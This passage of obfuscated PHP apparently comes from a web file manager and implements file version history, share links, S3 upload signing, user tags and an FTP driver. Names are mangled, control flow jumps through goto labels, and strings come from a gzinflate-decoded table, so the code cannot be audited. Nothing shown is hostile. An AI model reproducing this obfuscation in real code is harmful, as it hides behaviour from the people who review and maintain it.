Model($ÚŸ’âÀ¡[767])->get($ÚŸ’âÀ¡[1231]); $†İ™øã = $GLOBALS[$ÚŸ’âÀ¡[6]][$ÚŸ’âÀ¡[89]][$ÚŸ’âÀ¡[1209]]; $¾ ˜ü—Š = $˜®Ú¬¯¤ == $ÚŸ’âÀ¡[1232] ? min(5, $†İ™øã) : $†İ™øã; if ($†İ™øã <= 0) { return; } $‘Ó§Ô¡ñ = IO::info($ôÃ•°”·); $—ˆÔ½›¢ = $ù´·˜©â[$ÚŸ’âÀ¡[369]]; if ($‘Ó§Ô¡ñ[$ÚŸ’âÀ¡[76]] == 0) { return; } if ($‘Ó§Ô¡ñ[$ÚŸ’âÀ¡[76]] >= 1024 * 1024 * 500) { return !1; } $ ğü«ø = IO::hashSimple($ôÃ•°”·); if ($—ˆÔ½›¢ && $—ˆÔ½›¢[0][$ÚŸ’âÀ¡[177]] == $ ğü«ø) { return !0; } if (array_key_exists($ÚŸ’âÀ¡[202], $‘Ó§Ô¡ñ) && !$‘Ó§Ô¡ñ[$ÚŸ’âÀ¡[202]]) { return !1; } $¯ÆĞ½êÜ = short_id(time()); $åŸı¡ùÖ = array($ÚŸ’âÀ¡[399] => $¯ÆĞ½êÜ, $ÚŸ’âÀ¡[177] => $ ğü«ø, $ÚŸ’âÀ¡[32] => $‘Ó§Ô¡ñ[$ÚŸ’âÀ¡[32]] . $ÚŸ’âÀ¡[10] . date($ÚŸ’âÀ¡[1233]) . rand_string(1), $ÚŸ’âÀ¡[76] => $‘Ó§Ô¡ñ[$ÚŸ’âÀ¡[76]], $ÚŸ’âÀ¡[454] => USER_ID, $ÚŸ’âÀ¡[200] => time(), $ÚŸ’âÀ¡[1234] => $ÚŸ’âÀ¡[12]); IO::mkdir($ù´·˜©â[$ÚŸ’âÀ¡[1235]]); $±¯öë¥„ = IO::copy($ôÃ•°”·, $ù´·˜©â[$ÚŸ’âÀ¡[1235]], !1, $åŸı¡ùÖ[$ÚŸ’âÀ¡[32]]); if (!$±¯öë¥„) { self::clearEmptyFolder($ù´·˜©â[$ÚŸ’âÀ¡[1235]]); return !1; } array_unshift($—ˆÔ½›¢, $åŸı¡ùÖ); if (count($—ˆÔ½›¢) > $¾ ˜ü—Š) { $æñíı = array_slice($—ˆÔ½›¢, $¾ ˜ü—Š); foreach ($æñíı as $ş†ÔÈæŠ) { IO::remove($ù´·˜©â[$ÚŸ’âÀ¡[1235]] . $ş†ÔÈæŠ[$ÚŸ’âÀ¡[32]]); } $—ˆÔ½›¢ = array_slice($—ˆÔ½›¢, 0, $¾ ˜ü—Š); } return self::saveData($ù´·˜©â[$ÚŸ’âÀ¡[1236]], $—ˆÔ½›¢); } public static function remove($õ›‘­ğ, $³ªû‰Ì) { $Ã¹ˆË©¿ =& $_SERVER[ßğøİ]; $ÌŞÈûâÄ = self::listData($õ›‘­ğ); $»æÄşŸ  = array(); if (!$ÌŞÈûâÄ) { return !1; } foreach ($ÌŞÈûâÄ[$Ã¹ˆË©¿[369]] as $É†øÒÛí) { if ($É†øÒÛí[$Ã¹ˆË©¿[399]] == $³ªû‰Ì) { IO::remove($ÌŞÈûâÄ[$Ã¹ˆË©¿[1235]] . $É†øÒÛí[$Ã¹ˆË©¿[32]]); continue; } $»æÄşŸ [] = $É†øÒÛí; } return self::saveData($ÌŞÈûâÄ[$Ã¹ˆË©¿[1236]], $»æÄşŸ ); } public static function clear($¹‹È§èŸ, $áÂ“Ä—® = true) { $ÖÑ¥¦‰› =& $_SERVER[ßğøİ]; $½ô›¨—ã = self::listData($¹‹È§èŸ, $áÂ“Ä—®); if (!$½ô›¨—ã) { return !1; } foreach ($½ô›¨—ã[$ÖÑ¥¦‰›[369]] as $ ‹¥ó·) { IO::remove($½ô›¨—ã[$ÖÑ¥¦‰›[1235]] . $ ‹¥ó·[$ÖÑ¥¦‰›[32]]); } return self::saveData($½ô›¨—ã[$ÖÑ¥¦‰›[1236]], array()); } public static function moveHistory($ú‹ìÚƒ, $·Ø­‘Ù = '', $Çüï—ÓŠ = '') { $ˆ÷‰ı“ê =& $_SERVER[ßğøİ]; $á­±÷ƒˆ = self::listData($ú‹ìÚƒ, !1); if (!$á­±÷ƒˆ || !$á­±÷ƒˆ[$ˆ÷‰ı“ê[369]]) { return !1; } $™Š½õÎ˜ = $ˆ÷‰ı“ê[1223]; $·Ø­‘Ù = $·Ø­‘Ù ? $·Ø­‘Ù : get_path_this($ú‹ìÚƒ); $Çüï—ÓŠ = $Çüï—ÓŠ ? $Çüï—ÓŠ : $á­±÷ƒˆ[$ˆ÷‰ı“ê[1235]]; $ŸÛıåîã = substr(get_path_this($á­±÷ƒˆ[$ˆ÷‰ı“ê[1236]]), 0, -strlen($™Š½õÎ˜)); foreach ($á­±÷ƒˆ[$ˆ÷‰ı“ê[369]] as $ôôû§ò× => $ôî›ÆÌ) { $ÂÆ‰È¦ç = $·Ø­‘Ù . substr($ôî›ÆÌ[$ˆ÷‰ı“ê[32]], strlen($ŸÛıåîã)); $—ÈÏÉåÁ = IO::move($á­±÷ƒˆ[$ˆ÷‰ı“ê[1235]] . $ôî›ÆÌ[$ˆ÷‰ı“ê[32]], $Çüï—ÓŠ, !1, $ÂÆ‰È¦ç); if ($—ÈÏÉåÁ) { $á­±÷ƒˆ[$ˆ÷‰ı“ê[369]][$ôôû§ò×][$ˆ÷‰ı“ê[32]] = $ÂÆ‰È¦ç; } } $á­±÷ƒˆ[$ˆ÷‰ı“ê[1236]] = IO::move($á­±÷ƒˆ[$ˆ÷‰ı“ê[1236]], $Çüï—ÓŠ, !1, $·Ø­‘Ù . $™Š½õÎ˜); self::saveData($á­±÷ƒˆ[$ˆ÷‰ı“ê[1236]], $á­±÷ƒˆ[$ˆ÷‰ı“ê[369]]); self::clearEmptyFolder($á­±÷ƒˆ[$ˆ÷‰ı“ê[1235]]); } public static function rollback($ôå•Û„, $‡Û¤¤û) { $ÜÇ®©êş =& $_SERVER[ßğøİ]; $€´³÷Èô = self::listData($ôå•Û„); if (!$€´³÷Èô) { return; } $†ü¬şÙû = IO::info($ôå•Û„); foreach ($€´³÷Èô[$ÜÇ®©êş[369]] as $á®µ½ÉÊ => $´å–¬ØĞ) { if ($´å–¬ØĞ[$ÜÇ®©êş[399]] == $‡Û¤¤û) { self::add($ôå•Û„); $¬¡ù²ßê = $€´³÷Èô[$ÜÇ®©êş[1235]] . $´å–¬ØĞ[$ÜÇ®©êş[32]]; $œ€’‘¦ = IO::copy($¬¡ù²ßê, IO::pathFather($ôå•Û„), REPEAT_REPLACE, $†ü¬şÙû[$ÜÇ®©êş[32]]); if ($œ€’‘¦) { self::remove($ôå•Û„, $‡Û¤¤û); } return $œ€’‘¦; } } return !1; } public static function setDetail($†àÚáÊÙ, $²çÆæÙÔ, $ÃØØ¸¨¿) { $Ò˜®şÊù =& $_SERVER[ßğøİ]; $÷ÙÍÕâà = self::listData($†àÚáÊÙ); if (!$÷ÙÍÕâà) { return; } foreach ($÷ÙÍÕâà[$Ò˜®şÊù[369]] as $‡´£„‘Ş => $ßÔ…›¸) { if ($ßÔ…›¸[$Ò˜®şÊù[399]] == $²çÆæÙÔ) { $÷ÙÍÕâà[$Ò˜®şÊù[369]][$‡´£„‘Ş][$Ò˜®şÊù[1234]] = $ÃØØ¸¨¿; self::saveData($÷ÙÍÕâà[$Ò˜®şÊù[1236]], $÷ÙÍÕâà[$Ò˜®şÊù[369]]); return !0; } } return !1; } public static function fileInfo($¼×ƒ¢ô´, $¿—ó’ì) { $è„„Ä®Ğ =& $_SERVER[ßğøİ]; $ë“–‹ = self::listData($¼×ƒ¢ô´); if (!$ë“–‹) { show_json(LNG($è„„Ä®Ğ[105]), !1); } $à÷’ÍêÑ = $è„„Ä®Ğ[12]; foreach ($ë“–‹[$è„„Ä®Ğ[369]] as $‚‰â¤œ => $½´ßõ¿û) { if ($½´ßõ¿û[$è„„Ä®Ğ[399]] != $¿—ó’ì) { continue; } $à÷’ÍêÑ = $ë“–‹[$è„„Ä®Ğ[1235]] . $½´ßõ¿û[$è„„Ä®Ğ[32]]; break; } if (!$à÷’ÍêÑ) { show_json(LNG($è„„Ä®Ğ[105]), !1); } return IO::info($à÷’ÍêÑ); } public static function fileOut($“É£Šö, $„‰úïà•, $÷Ïşµè§ = false) { $•óâî¦ª =& $_SERVER[ßğøİ]; $‘ÌÃÃ²Ô = self::fileInfo($“É£Šö, $„‰úïà•); $ÙÌÒ¶À‹ =& $GLOBALS[$•óâî¦ª[7]]; $÷Ïşµè§ = isset($ÙÌÒ¶À‹[$•óâî¦ª[1199]]) && $ÙÌÒ¶À‹[$•óâî¦ª[1199]] == 1; if (isset($ÙÌÒ¶À‹[$•óâî¦ª[33]]) && $ÙÌÒ¶À‹[$•óâî¦ª[33]] == $•óâî¦ª[1237]) { return IO::fileOutImage($‘ÌÃÃ²Ô[$•óâî¦ª[84]], $ÙÌÒ¶À‹[$•óâî¦ª[1238]]); } IO::fileOut($‘ÌÃÃ²Ô[$•óâî¦ª[84]], $÷Ïşµè§, get_path_this($“É£Šö)); } public static function listData($÷Ñ°›øÌ, $¥ê¬ûŠÖ = true) { $¥ùŠš•³ =& $_SERVER[ßğøİ]; if ($¥ê¬ûŠÖ && !IO::exist($÷Ñ°›øÌ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($÷Ñ°›øÌ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $­Œêàƒ = self::pathHistory($÷Ñ°›øÌ); $ƒÅıİ¨§ = array($¥ùŠš•³[1236] => $­Œêàƒ . $¥ùŠš•³[1223], $¥ùŠš•³[1235] => rtrim(get_path_father($­Œêàƒ), $¥ùŠš•³[8]) . $¥ùŠš•³[8], $¥ùŠš•³[369] => array()); $ËèÈ£á¦ = IO::getContent($ƒÅıİ¨§[$¥ùŠš•³[1236]]); if ($ËèÈ£á¦) { $ß×Éæ‰Ù = json_decode($ËèÈ£á¦, !0); if (is_array($ß×Éæ‰Ù)) { $ƒÅıİ¨§[$¥ùŠš•³[369]] = $ß×Éæ‰Ù; } } return $ƒÅıİ¨§; } private static function saveData($¥˜×ò¾, $Öóƒşõ) { $…´¬æ¨¬ =& $_SERVER[ßğøİ]; self::log($…´¬æ¨¬[1239] . $¥˜×ò¾ . $…´¬æ¨¬[71] . count($Öóƒşõ), $…´¬æ¨¬[749]); if ($Öóƒşõ) { return IO::setContent($¥˜×ò¾, json_encode($Öóƒşõ)); } $ÑÃ›ª¬ = IO::pathFather($¥˜×ò¾); IO::remove($¥˜×ò¾); self::clearEmptyFolder($ÑÃ›ª¬); return !0; } public static function clearEmptyFolder($ä·¨şÓû) { $ööËÍ› =& $_SERVER[ßğøİ]; if (trim($ä·¨şÓû, $ööËÍ›[8]) == trim(self::$_historyBase, $ööËÍ›[8])) { return; } $ò€¦ä¼ = IO::pathFather($ä·¨şÓû); $¦íÂ˜š— = IO::has($ä·¨şÓû, !0); if ($¦íÂ˜š—[$ööËÍ›[207]] > 0 || $¦íÂ˜š—[$ööËÍ›[208]] > 0) { return; } IO::remove($ä·¨şÓû); self::clearEmptyFolder($ò€¦ä¼); } private static function getBasePath() { $¥ğªú»Ö =& $_SERVER[ßğøİ]; $Ï‹°îåı = Model($¥ğªú»Ö[1240])->get($¥ğªú»Ö[1241]); if ($Ï‹°îåı) { if (!IO::exist($Ï‹°îåı)) { IO::mkdir($Ï‹°îåı); } if (get_path_this($Ï‹°îåı) == $¥ğªú»Ö[1226]) { $Úàèááù = $¥ğªú»Ö[1242] . rand_string(8); @rename($Ï‹°îåı, get_path_father($Ï‹°îåı) . $¥ğªú»Ö[8] . $Úàèááù); $Ï‹°îåı = DATA_PATH . $Úàèááù . $¥ğªú»Ö[8]; file_put_contents(DATA_PATH . $¥ğªú»Ö[1243], $¥ğªú»Ö[12]); Model($¥ğªú»Ö[1240])->set($¥ğªú»Ö[1241], $Ï‹°îåı); } return $Ï‹°îåı; } $Ï‹°îåı = DATA_PATH . $¥ğªú»Ö[1242] . rand_string(8) . $¥ğªú»Ö[8]; $Ï‹°îåı = IO::mkdir($Ï‹°îåı); $Ï‹°îåı = rtrim($Ï‹°îåı, $¥ğªú»Ö[8]) . $¥ğªú»Ö[8]; file_put_contents($Ï‹°îåı . $¥ğªú»Ö[1243], $¥ğªú»Ö[12]); file_put_contents(DATA_PATH . $¥ğªú»Ö[1243], $¥ğªú»Ö[12]); Model($¥ğªú»Ö[1240])->set($¥ğªú»Ö[1241], $Ï‹°îåı); return $Ï‹°îåı; } } goto eğ˜‹ËìØÆ; d®éÚ¨Æ‡Ô: $_SERVER[©·å†­”] = explode($_SERVER[ßğøİ][616], gzinflate(substr($_SERVER[ßğøİ][617], 10, -8))); $lewkctjyif = $_SERVER[ßğøİ][618]; if (!$lewkctjyif) { return; } goto bØœŞÙ­—À; C°ºÉæ¯ùš: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ÂüŸ†øù) { $this->pathParse = $ÂüŸ†øù; } protected function infoParse($·º¸´ü, $Í¾£ÖÒ¤ = false) { $úïÖ„êË =& $_SERVER[ßğøİ]; return Action($úïÖ„êË[1175])->sharePathInfo($this->pathParse[$úïÖ„êË[84]], !0, $Í¾£ÖÒ¤); } public function listPath($µ ›æƒ, $‹Ôß…Æ× = false) { $ÚÛÎóÉ¿ =& $_SERVER[ßğøİ]; $Í¬À­ç = IO::listPath($µ ›æƒ, $‹Ôß…Æ×); if (!$Í¬À­ç) { return $Í¬À­ç; } if (is_array($Í¬À­ç[$ÚÛÎóÉ¿[1336]])) { $ùùÖäÄ¦ = Action($ÚÛÎóÉ¿[1345])->parsePathChildren($Í¬À­ç[$ÚÛÎóÉ¿[1336]], array($ÚÛÎóÉ¿[421] => $µ ›æƒ)); $Í¬À­ç[$ÚÛÎóÉ¿[1336]] = Action($ÚÛÎóÉ¿[1175])->shareItemInfo($ùùÖäÄ¦); } foreach ($Í¬À­ç as $ş¥•½¥¬ => $ŠÅ¹¤‹) { if (!in_array($ş¥•½¥¬, array($ÚÛÎóÉ¿[83], $ÚÛÎóÉ¿[82]))) { continue; } foreach ($ŠÅ¹¤‹ as $‹ŞåşÆÔ => $ùùÖäÄ¦) { $ùùÖäÄ¦ = Action($ÚÛÎóÉ¿[1345])->parsePathChildren($ùùÖäÄ¦, array($ÚÛÎóÉ¿[421] => $µ ›æƒ)); $Í¬À­ç[$ş¥•½¥¬][$‹ŞåşÆÔ] = Action($ÚÛÎóÉ¿[1175])->shareItemInfo($ùùÖäÄ¦); } } return $Í¬À­ç; } public function listAll($¿…¢È–Œ) { $¾ŞñĞêæ =& $_SERVER[ßğøİ]; $¶¢ÀıŞ÷ = IO::listAll($¿…¢È–Œ); foreach ($¶¢ÀıŞ÷ as &$Úø€ÛŠ) { $æÀ¥­ş¿ = IO::info($Úø€ÛŠ[$¾ŞñĞêæ[84]]); $æÀ¥­ş¿ = is_array($æÀ¥­ş¿) ? $æÀ¥­ş¿ : array(); $Úø€ÛŠ = array_merge($æÀ¥­ş¿, $Úø€ÛŠ); $Úø€ÛŠ[$¾ŞñĞêæ[86]] = Action($¾ŞñĞêæ[1175])->shareItemInfo($Úø€ÛŠ); } unset($Úø€ÛŠ); return $¶¢ÀıŞ÷; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($´¢‡·ˆª) { parent::__construct($´¢‡·ˆª); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($¾·ØıÚ‘) { parent::__construct($¾·ØıÚ‘); $this->signatureVersion($_SERVER[ßğøİ][216]); } public function uploadFormData($ñïéáü, $€Ü‹²™ = 3600) { $àãø€–á =& $_SERVER[ßğøİ]; $®Ì¿×® = $àãø€–á[198]; $Ç±¿èá = $àãø€–á[1346]; $ç‘×»ú‰ = $àãø€–á[62]; $”ÒÒ©Íü = gmdate($àãø€–á[1347]); $•˜°§ğÚ = gmdate($àãø€–á[748]); $¯ÛÌ„³Ø = $àãø€–á[1348]; $ÜÚªŠ = $€Ü‹²™ . $àãø€–á[12]; $ÌÓõŒ©« = $àãø€–á[1310]; $‰Ñıñç = array($this->accessKey, $•˜°§ğÚ, $this->region, $ç‘×»ú‰, $¯ÛÌ„³Ø); $µÎ‰–ó = implode($àãø€–á[8], $‰Ñıñç); $­´Ñ¬Óã = array($àãø€–á[1312] => gmdate($àãø€–á[1311], strtotime($àãø€–á[1349])), $àãø€–á[1313] => array(array($àãø€–á[1315] => $this->bucket), array($àãø€–á[1314] => $®Ì¿×®), array($àãø€–á[1316], $àãø€–á[1317], $àãø€–á[12]), array($àãø€–á[1316], $àãø€–á[1350], $àãø€–á[12]), array($àãø€–á[1316], $àãø€–á[1351], $àãø€–á[12]), array($àãø€–á[1318] => $ÌÓõŒ©«), array($àãø€–á[1352] => $µÎ‰–ó), array($àãø€–á[1353] => $Ç±¿èá), array($àãø€–á[1354] => $”ÒÒ©Íü), array($àãø€–á[1355] => $ÜÚªŠ))); $ï’ÈÀúÜ = base64_encode(json_encode($­´Ñ¬Óã)); $Óóİ·ûë = hash_hmac($àãø€–á[1356], $•˜°§ğÚ, $àãø€–á[1357] . $this->secret, !0); $²óêµÜ§ = hash_hmac($àãø€–á[1356], $this->region, $Óóİ·ûë, !0); $¶Ê´–ş = hash_hmac($àãø€–á[1356], $ç‘×»ú‰, $²óêµÜ§, !0); $° ìÏî = hash_hmac($àãø€–á[1356], $¯ÛÌ„³Ø, $¶Ê´–ş, !0); $ï¢ë¯¨ = hash_hmac($àãø€–á[1356], $ï’ÈÀúÜ, $° ìÏî); $¤®àê¥¨ = array($àãø€–á[215] => $àãø€–á[12], $àãø€–á[1358] => $àãø€–á[12], $àãø€–á[1314] => $®Ì¿×®, $àãø€–á[1318] => $ÌÓõŒ©«, $àãø€–á[1322] => $ï’ÈÀúÜ, $àãø€–á[1359] => $µÎ‰–ó, $àãø€–á[1360] => $Ç±¿èá, $àãø€–á[1361] => $”ÒÒ©Íü, $àãø€–á[1362] => $ÜÚªŠ, $àãø€–á[1363] => $ï¢ë¯¨, $àãø€–á[181] => $this->getHost()); return $¤®àê¥¨; } } goto EÒ†±­·—¶; B•Ø‰¦ÖÈÏ: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\162\56\164\x61\147\114\151\x73\x74"; public $modelType = "\125\163\x65\162\117\x70\164\x69\x6f\x6e"; public $field = array("\x6e\141\155\145", "\x73\x74\171\x6c\x65", "\163\x6f\162\164"); public function listData($è‹§ñ¬– = false, $š“«³  = "\163\x6f\x72\164", $şÛù‹Ç = false) { return parent::listData($è‹§ñ¬–, $š“«³ , $şÛù‹Ç); } public function remove($…ç°º·Û) { return parent::remove($…ç°º·Û); } public function add($áÕ—•, $çñî¸¼ = "\154\x61\x62\145\x6c\x2d\147\x72\x65\171\x2d\156\x6f\162\x6d\x61\x6c") { $¢«ñù¿‚ =& $_SERVER[ßğøİ]; if ($this->findByName($áÕ—•)) { return !1; } $¤³ÑøÄò = array($¢«ñù¿‚[420] => $áÕ—•, $¢«ñù¿‚[485] => $çñî¸¼, $¢«ñù¿‚[1832] => $this->getSort($¢«ñù¿‚[258]) + 1); return parent::insert($¤³ÑøÄò); } public function update($Õ©ÕúÏ», $³ş´¡§) { $ø—ø¤Ò³ =& $_SERVER[ßğøİ]; $‰ìÑ’†ˆ = $this->listData($Õ©ÕúÏ»); $º¨ëª¬² = $this->findByName($³ş´¡§[$ø—ø¤Ò³[32]]); if (!$‰ìÑ’†ˆ || $º¨ëª¬² && $º¨ëª¬²[$ø—ø¤Ò³[399]] != $‰ìÑ’†ˆ[$ø—ø¤Ò³[399]]) { return !1; } return parent::update($Õ©ÕúÏ», $³ş´¡§); } public function moveTop($“äñ—Á÷) { $˜šˆç§£ =& $_SERVER[ßğøİ]; $ã¬Ãßü = parent::listData(); $Ö¡ÉŠÖ¸ = $this->getSort($˜šˆç§£[257]); foreach ($ã¬Ãßü as &$ËÎ½¿—) { if ($ËÎ½¿—[$˜šˆç§£[399]] == $“äñ—Á÷) { $ËÎ½¿—[$˜šˆç§£[1852]] = $Ö¡ÉŠÖ¸; continue; } $ËÎ½¿—[$˜šˆç§£[1852]] += 1; } unset($ËÎ½¿—); return parent::resetData($ã¬Ãßü); } public function moveBottom($Úüõ‡òš) { $ñ‚âÇ ½ =& $_SERVER[ßğøİ]; $×ÀÔ–«ö = $this->getSort($ñ‚âÇ ½[258]) + 1; return parent::update($Úüõ‡òš, array($ñ‚âÇ ½[1852] => $×ÀÔ–«ö)); } public function resetSort($ˆúÍÅÇ¿) { $‹Â·Ãş‹ =& $_SERVER[ßğøİ]; $œøÙÊˆ† = array(); $ˆúÍÅÇ¿ = is_array($ˆúÍÅÇ¿) ? $ˆúÍÅÇ¿ : array(); for ($šè§ÉÇ = 0; $šè§ÉÇ < count($ˆúÍÅÇ¿); $šè§ÉÇ++) { $œøÙÊˆ†[$ˆúÍÅÇ¿[$šè§ÉÇ] . $‹Â·Ãş‹[12]] = $šè§ÉÇ + 1; } $êñ¯âœ = parent::listData(); foreach ($êñ¯âœ as &$¶Ôæ»—¯) { $‰´‰Â¢ì = $œøÙÊˆ†[$¶Ôæ»—¯[$‹Â·Ãş‹[399]]]; $¶Ôæ»—¯[$‹Â·Ãş‹[1852]] = $‰´‰Â¢ì ? $‰´‰Â¢ì : $¶Ôæ»—¯[$‹Â·Ãş‹[1852]]; } unset($¶Ôæ»—¯); return parent::resetData($êñ¯âœ); } private function getSort($éâıˆà) { $Ş†éŞÔ =& $_SERVER[ßğøİ]; $œîìÁ°š = parent::listData(); $¤ÀÇÏ“ = array_to_keyvalue($œîìÁ°š, $Ş†éŞÔ[12], $Ş†éŞÔ[1852]); if (!$¤ÀÇÏ“) { $¤ÀÇÏ“ = array(0); } $­ÖûäÓ¬ = $éâıˆà == $Ş†éŞÔ[258] ? max($¤ÀÇÏ“) : min($¤ÀÇÏ“); return intval($­ÖûäÓ¬); } } goto a•Æœ£á­Ş; EÒ†±­·—¶: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($æòë­ã¶) { parent::__construct(); if (count($æòë­ã¶) > 0) { $this->_init($æòë­ã¶); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($å¢²‹„) { $É²ôı€ =& $_SERVER[ßğøİ]; global $config; $this->appCharset = $config[$É²ôı€[1364]]; $this->systemCharset = $config[$É²ôı€[1365]]; if (isset($å¢²‹„[$É²ôı€[1366]]) && $å¢²‹„[$É²ôı€[1366]]) { $this->systemCharset = $å¢²‹„[$É²ôı€[1366]]; } } public function iconvApp($Éßœ—´Ì) { return $this->iconvTo($Éßœ—´Ì, $this->systemCharset, $this->appCharset); } public function iconvSystem($ùË×¶Œ…) { return $this->iconvTo($ùË×¶Œ…, $this->appCharset, $this->systemCharset); } public function getPathOuter($ÛÒœõäˆ) { $¾¥ŞÙö‘ =& $_SERVER[ßğøİ]; $•‚Çãü = $this->iconvApp($this->pathBase); $ÛÒœõäˆ = $this->iconvApp($ÛÒœõäˆ); if (substr($•‚Çãü, 0, 2) == $¾¥ŞÙö‘[1367]) { $•‚Çãü = BASIC_PATH . substr($•‚Çãü, 2); } if (substr($ÛÒœõäˆ, 0, 2) == $¾¥ŞÙö‘[1367]) { $ÛÒœõäˆ = BASIC_PATH . substr($ÛÒœõäˆ, 2); } $•‚Çãü = KodIO::clear($•‚Çãü); $ÛÒœõäˆ = KodIO::clear($ÛÒœõäˆ); $ÛÒœõäˆ = substr($ÛÒœõäˆ, strlen($•‚Çãü)); if (empty($this->pathDriver)) { return $ÛÒœõäˆ; } return $this->pathDriver . $¾¥ŞÙö‘[8] . ltrim($ÛÒœõäˆ, $¾¥ŞÙö‘[8]); } private function _init($åóïğø² = array()) { $ı²£±Ã• =& $_SERVER[ßğøİ]; if (!function_exists($ı²£±Ã•[1368])) { throw new Exception(LNG($ı²£±Ã•[1369])); } $this->config = $åóïğø²; $this->charsetReset($åóïğø²); foreach ($åóïğø² as $¸„¶ÜÒ => $Šà¢ÄÚ) { if (isset($this->{$¸„¶ÜÒ})) { $this->{$¸„¶ÜÒ} = $Šà¢ÄÚ; } } return $this->_login($åóïğø²); } private function _login($ó°Ë¹½) { $•À¾ =& $_SERVER[ßğøİ]; static $…™ğ÷· = array(); $‡ë¨‰ÙÚ = md5(json_encode($ó°Ë¹½)); if (isset($…™ğ÷·[$‡ë¨‰ÙÚ])) { foreach ($…™ğ÷·[$‡ë¨‰ÙÚ] as $‰“¯„©º => $şÆ¬² ø) { $this->{$‰“¯„©º} = $şÆ¬² ø; } return !0; } $±É¾ƒ« = parse_url(trim($this->server, $•À¾[8])); $this->host = $±É¾ƒ«[$•À¾[181]]; $û÷íš“… = isset($±É¾ƒ«[$•À¾[180]]) && $±É¾ƒ«[$•À¾[180]] == $•À¾[1370] ? !0 : !1; $this->scheme = $û÷íš“… ? $•À¾[1371] : $•À¾[1372]; $this->port = isset($±É¾ƒ«[$•À¾[182]]) ? $±É¾ƒ«[$•À¾[182]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $„ã˜Öé« = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $œ½ı­ç = $this->pasv == $•À¾[88] ? !0 : !1; @ftp_pasv($this->connect, $œ½ı­ç); $…™ğ÷·[$‡ë¨‰ÙÚ] = array($•À¾[1373] => $this->connect, $•À¾[181] => $this->host, $•À¾[180] => $this->scheme, $•À¾[182] => $this->port); return $„ã˜Öé«; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($Ü÷‡×ı, $á—¾±†² = '', $ü³á¬ÄÄ = REPEAT_RENAME) { if ($this->setContent($Ü÷‡×ı, $á—¾±†²)) { return $this->getPathOuter($Ü÷‡×ı); } return !1; } public function mkdir($…È¡ù´, $² ÙâÄ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $…È¡ù´ = $this->iconvSystem($…È¡ù´); if ($this->_isFolder($…È¡ù´) || @ftp_mkdir($this->connect, $…È¡ù´)) { return $this->getPathOuter($…È¡ù´); } if (!$this->mkdir($this->pathFather($…È¡ù´))) { return !1; } if ($…È¡ù´ = @ftp_mkdir($this->connect, $…È¡ù´)) { return $this->getPathOuter($…È¡ù´); } return !1; } public function copyFile($‚ÔŠİîÌ, $¬’ŞÎùÅ) { if (!$this->_isconn()) { return !1; } $êëØ—½Š = $this->pathThis($this->iconvSystem($‚ÔŠİîÌ)); $ĞÈŠ½•ß = $this->tempFile($êëØ—½Š); $…Ù¸£Ã = $this->iconvApp($ĞÈŠ½•ß); $this->download($‚ÔŠİîÌ, $…Ù¸£Ã); $ı¤‹Öí¥ = $this->upload($¬’ŞÎùÅ, $…Ù¸£Ã); $this->tempFileRemve($ĞÈŠ½•ß); return $ı¤‹Öí¥; } public function moveFile($–‹¥Ä€, $ÉèÔõğ°) { if (!$this->_isconn()) { return !1; } $–‹¥Ä€ = $this->iconvSystem($–‹¥Ä€); $ÉèÔõğ° = $this->iconvSystem($ÉèÔõğ°); $€İ–ÌÄ• = @ftp_rename($this->connect, $–‹¥Ä€, $ÉèÔõğ°); return $€İ–ÌÄ• ? $this->getPathOuter($ÉèÔõğ°) : !1; } public function delFile($Ä«•Øê÷) { if (!$this->_isconn()) { return !1; } $Ä«•Øê÷ = $this->iconvSystem($Ä«•Øê÷); return @ftp_delete($this->connect, $Ä«•Øê÷); } public function delFolder($¿ñ“ô±ˆ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Èœ¢¶¸ = $ìñ¨Åìô = array(); $this->fileList($¿ñ“ô±ˆ, $Èœ¢¶¸, $ìñ¨Åìô, !0); $this->listItemCache = !0; foreach ($ìñ¨Åìô as $Âü‘‘‹Ë) { $ïâé¯² = $this->iconvSystem($Âü‘‘‹Ë[$_SERVER[ßğøİ][32]]); $äÜø¸€í = @ftp_delete($this->connect, $ïâé¯²); if (!$äÜø¸€í) { return !1; } } foreach ($Èœ¢¶¸ as $ïâé¯²) { $ïâé¯² = $this->iconvSystem($ïâé¯²); $äÜø¸€í = @ftp_rmdir($this->connect, $ïâé¯²); if (!$äÜø¸€í) { return !1; } } $¿ñ“ô±ˆ = $this->iconvSystem($¿ñ“ô±ˆ); return @ftp_rmdir($this->connect, $¿ñ“ô±ˆ); } public function rename($„Ì¸¤İÌ, $üÃ‡æáñ) { $©¦Óë¿Î =& $_SERVER[ßğøİ]; if (!$this->_isconn()) { return !1; } $„†ÇÀ‘¢ = $this->fileNameAuto($this->pathFather($„Ì¸¤İÌ), $üÃ‡æáñ); $„†ÇÀ‘¢ = $this->iconvSystem($„†ÇÀ‘¢); $„Ì¸¤İÌ = $this->iconvSystem($„Ì¸¤İÌ); $ç³¹Œë = $this->pathFather($„Ì¸¤İÌ); $Âµ©âê = rtrim($ç³¹Œë, $©¦Óë¿Î[8]) . $©¦Óë¿Î[8] . $„†ÇÀ‘¢; $®éÓÎËÌ = @ftp_rename($this->connect, $„Ì¸¤İÌ, $Âµ©âê); $Âµ©âê = $this->iconvApp($Âµ©âê); return $®éÓÎËÌ ? $this->getPathOuter($Âµ©âê) : !1; } private function folderInfo($ı¤ïÈ¥ã, $ÜİãÌÊœ = false) { $Óàì÷Õ¤ =& $_SERVER[ßğøİ]; $„ßÎÚÌğ = array($Óàì÷Õ¤[32] => $this->pathThis($ı¤ïÈ¥ã), $Óàì÷Õ¤[84] => $this->getPathOuter($Óàì÷Õ¤[8] . $ı¤ïÈ¥ã), $Óàì÷Õ¤[33] => 